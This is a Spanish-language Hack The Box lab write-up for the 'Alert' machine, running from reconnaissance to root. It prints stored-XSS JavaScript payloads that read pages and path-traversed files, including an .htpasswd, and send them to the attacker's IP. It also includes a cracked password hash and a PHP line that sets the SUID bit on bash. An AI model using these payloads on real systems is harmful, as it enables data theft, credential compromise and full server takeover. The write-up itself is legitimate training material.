---
title: Alert
date: 2025-12-12 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, alert]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/6f4647030d6aadc676b8d8a459de344f.png
    alt: Hack The Box
---

> Alert
Linux · Easy 

## Task 1

How many open TCP ports are listening on Alert?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 5000 10.129.231.188
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 22:20 CET
Warning: 10.129.231.188 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.231.188
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
12227/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.39 seconds
```

> 2

## Task 2

What is the primary domain name used by the webserver on Alert?

Al acceder a la IP nos redirige a ```http://alert.htb/``` pero la página parece muerta, como ya hemos hecho en otros retros, vamos a 
ajustar nuestro fichero ```/etc/hosts``` para corregir esto añadiendo la línea ``` 10.129.231.188  alert.htb ```

> alert.htb

## Task 3

What is the full name of the subdomain of alert.htb that hosts a different application?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://alert.htb -H 'Host: FUZZ.alert.htb' --hc 301

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://alert.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                    
=====================================================================

000001261:   401        14 L     54 W       467 Ch      "statistics"     

```
La tarea 3 ya nos indica como debemos proceder, encuentro el subdominio statistics pero con un código ```401 unauthorized ```
o sea, que parece que exite ese subdominio pero solo para algún rol autorizado. Interesante.

> statistics.alert.htb

## Task 4 

What is the relative path on the site of the page that is vulnerable to a stored cross-site scripting (XSS) attack?

Aquí es donde empezamos a jugar con la web, descubro que si subo un archivo de Markdown (.md) y lo subo por ejemplo con el contenido 
típico para probar una injección XSS.

``` javascript
<script> alert("hacked")</script>
```
El contenido del archivo test.md es el siguiente. 
Ahora al pulsar el botón ```View Markdown```ya se ve que es vulnerable a injección de XSS. Nos redirige a ```visualizer.php```

> /visualizer.php

## Task 5

Does that admin user click on links sent to them via the content form?

``` javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://10.10.15.224', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    value: 'hello'
}));
</script>
```

``` html
jhony@plesehelp.org

can you check this site please? http://10.10.15.224 
```

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ python -m http.server 80                     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.15.224 - - [13/Dec/2025 23:15:42] "GET / HTTP/1.1" 200 -
10.10.15.224 - - [13/Dec/2025 23:16:03] code 501, message Unsupported method ('OPTIONS')
10.10.15.224 - - [13/Dec/2025 23:16:03] "OPTIONS / HTTP/1.1" 501 -
10.129.231.188 - - [13/Dec/2025 23:16:32] "GET / HTTP/1.1" 200 -
```

La mejor forma de comprobarlo sería enviándole un mensaje que contenga un link a un servidor para responder a esta pregunta. 
Así que monto un servidor con Python, lo testeo y le envío un mensaje por la página ```Contac Us``` aparece una IP y podemos confirmar 
que efectivamente hay alguien pulsando en los enlaces que enviamos. 

> yes

## Task 6

What is the name of the .txt file that there is a link to on the messages.php page?

Si accedemos a http://alert.htb/messages.php veremos una página en blanco, lo que da que pensar que debe ser la lista de mensajes que 
se envían y que como hemos comprobado están abriendo los enlaces que enviemos. 

Tenemos que intentar que el administrador o quien sea que esté abriendo los enlaces,
al abrir el nuestro cargue algún código nos envíe la información.  

El eterno Stackoverflow.com, nos da pistas de como crear un script que haga justo coger el contenido de una página y enviarlo.
[https://stackoverflow.com/questions/817218/how-to-get-the-entire-document-html-as-a-string](https://stackoverflow.com/questions/817218/how-to-get-the-entire-document-html-as-a-string) El método que estaba usando nos devolvía la IP de la víctima pero no el contenido
de la página que estaba cargando. 


<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", 'http://alert.htb/messages.php', true);    
const txt = document.documentElement.outerHTML;
var xhr_two = new XMLHttpRequest();
xhr_two.open("GET", 'http://10.10.15.224/' + txt, true);
xhr_two.send()
</script>

Así que fui probando distintos códigos

<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var data = encodeURIComponent(xhr.responseText);
        var xhr_two = new XMLHttpRequest();
        xhr_two.open("GET", "http://10.10.15.224/?" + data, true);
        xhr_two.send();
    }
};
xhr.open("GET", "http://alert.htb/messages.php", true);
xhr.send();
</script>

<script>
fetch("http://alert.htb/messages.php")
.then(r => r.text())
.then(t => fetch("http://10.10.15.224/?" + encodeURIComponent(t)))
</script>

Fue en este parte del reto donde  interactuas con la "víctima" cada vez que le envías algo por el contact us necesitas
adjuntar el enlace al fichero que realiza el "fishing". Al fin y al cabo está picando en el anzuelo y creemos
que el no sospecha nada. Parece que con el método fetch se hace más cortito.

```
jhony@plesehelp.org

Can you check my md please? http://alert.htb/visualizer.php?link_share=693f0535ea3868.48456934.md
```

``` shell
10.129.231.188 - - [14/Dec/2025 21:30:00] "GET /?%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.php%3Ffile%3D2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A HTTP/1.1" 200 -
```

```shell
[14/Dec/202521:30:00]"GET/?<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
```

> 2024-03-10_15-48-34.txt


## Task 7

What is the full path to the directory on Alert that holds files for the statistics.alert.htb site?

Ahora le vamos a ir enviando mensajes para ver si nos revela información importante, simplemente debemos enviar mensajes al "administrador" para que 
vaya ejecutando el código javascript que nos va revelando información, ahora que sabemos que su usuario, si tiene permisos para leer archivos de sistema


Usando [https://www.urldecoder.org/](https://www.urldecoder.org/) puedo ver como el administrador ha leído el mensaje y como accede a el. 

``` javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../etc/apache2/sites-available/000-default.conf")
.then(r => r.text())
.then(t => fetch("http://10.10.15.224/?" + encodeURIComponent(t)))
</script>
```
Además podemos valernos de la vulnerabilidad de transversal path para encontrar información del sistema muy relevante.

``` shell
10.129.16.88 - - [15/Dec/2025 22:54:35] "GET /?%3Cpre%3E%3CVirtualHost%20*%3A80%3E%0A%20%20%20%20ServerName%20alert.htb%0A%0A%20%20%20%20DocumentRoot%20%2Fvar%2Fwww%2Falert.htb%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Falert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20RewriteEngine%20On%0A%20%20%20%20RewriteCond%20%25%7BHTTP_HOST%7D%20!%5Ealert%5C.htb%24%0A%20%20%20%20RewriteCond%20%25%7BHTTP_HOST%7D%20!%5E%24%0A%20%20%20%20RewriteRule%20%5E%2F%3F(.*)%24%20http%3A%2F%2Falert.htb%2F%241%20%5BR%3D301%2CL%5D%0A%0A%20%20%20%20ErrorLog%20%24%7BAPACHE_LOG_DIR%7D%2Ferror.log%0A%20%20%20%20CustomLog%20%24%7BAPACHE_LOG_DIR%7D%2Faccess.log%20combined%0A%3C%2FVirtualHost%3E%0A%0A%3CVirtualHost%20*%3A80%3E%0A%20%20%20%20ServerName%20statistics.alert.htb%0A%0A%20%20%20%20DocumentRoot%20%2Fvar%2Fwww%2Fstatistics.alert.htb%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Fstatistics.alert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Fstatistics.alert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20Indexes%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%20%20%20%20AuthType%20Basic%0A%20%20%20%20%20%20%20%20AuthName%20%22Restricted%20Area%22%0A%20%20%20%20%20%20%20%20AuthUserFile%20%2Fvar%2Fwww%2Fstatistics.alert.htb%2F.htpasswd%0A%20%20%20%20%20%20%20%20Require%20valid-user%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20ErrorLog%20%24%7BAPACHE_LOG_DIR%7D%2Ferror.log%0A%20%20%20%20CustomLog%20%24%7BAPACHE_LOG_DIR%7D%2Faccess.log%20combined%0A%3C%2FVirtualHost%3E%0A%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
```

Traducido con decoder

```
10.129.16.88--[15/Dec/202522:54:35]"GET/?<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
> /var/www/statistics.alert.htb

## Task 8

What is the password for the albert user on Alert?

Cuidado con estos ficheros ```.htpasswd``` siempre hay que investigarlos

``` javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
.then(r => r.text())
.then(t => fetch("http://10.10.15.224/?" + encodeURIComponent(t)))
</script>
```

```
10.129.16.88 - - [15/Dec/2025 23:06:06] "GET /?%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
```

``` 
10.129.16.88--[15/Dec/202523:06:06]"GET/?<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
HTTP/1.1"200-
```

```albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/``` Así que tenemos un hash


``` shell
┌──(pmartinezr㉿kali)-[~/htb/alert]
└─$ hashcat hash /usr/share/wordlists/rockyou.txt --user
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited  
```
Tenemos una password ```manchesterunited``` con hashcat y el diccionario rockyou consigo descifrala.


> manchesterunited


## Submit the flag located in the albert user's home directory.


``` shell
┌──(pmartinezr㉿kali)-[~/htb/alert]
└─$ ssh albert@alert.htb

albert@alert:~$ cat user.txt 
37a196b39d5cfff***************
``` 


## Task 10 

What is the full path to the php file being executed by the root user periodically?

Al reutilizar las credenciales en la página aparece un dashboard

``` html

Alert - Dashboard
Donations Received
Month 	Donations
January 2024	$669
February 2024	$235
March 2024	$981
April 2024	$937
May 2024	$560
June 2024	$686
July 2024	$858
August 2024	$419
September 2024	$674
October 2024	$335
November 2024	$913
December 2024	$420

Top 10 Frequent Donors

1	emily@alert.htb	$839
2	jonathan@alert.htb	$829
3	robert@alert.htb	$819
4	raquel@alert.htb	$809
5	mario@alert.htb	$799
6	amayrani@alert.htb	$789
7	axel@alert.htb	$759
8	sofia@alert.htb	$749
9	john@alert.htb	$739
10	mary@alert.htb	$719
Total Top 10 Donors:	$7850
```

Bueno tenemos lo que parece una lista de usuarios. Quizás los utilize en un futuro.


``` shell
ssh albert@alert.htb -L 8080:127.0.0.1:8080
```

Configuramos un tunnel ssh y con ```FoxyProxy``` la extensión en firefox y añadimo un proxy HTTP 127.0.0.1:8080 , ya que hemos descubierto que 
dicha aplicación corre en ese puerto.  

```  html
Website Monitor

There are no active incidents.
⬤ alert.htb HTTP/1.1 302
⬤ statistics.alert.htb HTTP/1.1 401

Website Monitor is an open source project inspired by broke.lol. Download it on GitHub.

```
> /opt/website-monitor/monitor.php


## Submit the flag located in the root user's home directory.

``` shell
albert@alert:~$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
/var/tmp
/var/lib/php/sessions
/var/www/alert.htb
/var/www/alert.htb/uploads
/var/www/alert.htb/messages
/var/www/alert.htb/css
/var/crash
/opt/website-monitor/monitors
/proc
/run/screen
/run/lock
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.X11-unix
/dev/mqueue
/dev/shm
```

Ahora sabemos que podemos escribir en ```/opt/website-monitor/monitors``` , es perfecto porque podemos ejecutar 
código php si accedemos a la página php que acabamos de generar

``` php
<?php system("chmod u+s /bin/bash"); ?>
```
Con este código haremos activa el bit SUID para el propietario del archivo
o sea que se ejecute con permisos de root.

Ahora en el navegador accedemos a http://127.0.0.1:8080/monitors/pwn.php. Esto como es ejecutado por root, hará que 
se cambie el bit SUID y por lo tanto se consigue una escalada de privilegios


```shell
albert@alert:/opt/website-monitor$ bash -p
bash-5.0# whoami
root

bash-5.0# cat root.txt 
8475a660710c9667c***************

```

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/636)

